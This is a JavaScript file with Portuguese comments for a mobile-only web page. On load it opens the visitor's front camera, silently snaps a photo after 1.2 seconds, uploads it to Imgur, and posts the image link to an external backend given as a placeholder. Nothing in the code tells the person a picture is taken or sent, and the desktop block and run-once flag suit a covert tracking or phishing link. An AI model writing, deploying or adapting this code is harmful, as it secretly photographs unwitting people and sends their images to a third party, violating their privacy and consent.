// Bloqueia acesso em desktop
if (!/Mobi|Android|iPhone|iPad|iPod|Opera Mini|IEMobile|Mobile/i.test(navigator.userAgent)) {
  document.body.innerHTML = '<div class="container"><h1>Disponível apenas em dispositivos móveis</h1></div>';
  throw new Error('Acesso bloqueado para desktop');
}

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

async function startCamera() {
  if (localStorage.getItem('fotoCapturada') === 'sim') return;
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user' },
      audio: false
    });
    video.srcObject = stream;
    video.onloadedmetadata = () => {
      setTimeout(() => capturePhoto(stream), 1200); // Aguarda 1.2s para garantir foco
    };
  } catch (e) {
    alert('Permissão da câmera negada ou não disponível.');
  }
}

function capturePhoto(stream) {
  localStorage.setItem('fotoCapturada', 'sim');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext('2d').drawImage(video, 0, 0);
  stream.getTracks().forEach(track => track.stop());
  canvas.toBlob(uploadToServer, 'image/jpeg', 0.95);
}

function uploadToServer(blob) {
  // Envia a imagem para o Imgur
  const clientId = '546f6e6e7e2e1e7'; // Exemplo público para testes
  const formData = new FormData();
  formData.append('image', blob);
  fetch('https://api.imgur.com/3/image', {
    method: 'POST',
    headers: { Authorization: 'Client-ID ' + clientId },
    body: formData
  })
    .then(res => res.json())
    .then(data => {
      if (data.success) {
        const imgurUrl = data.data.link;
        // Agora envia o link para o backend externo
        fetch('https://SEU_BACKEND/save-link', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ url: imgurUrl })
        });
      }
    });
}

window.onload = startCamera;
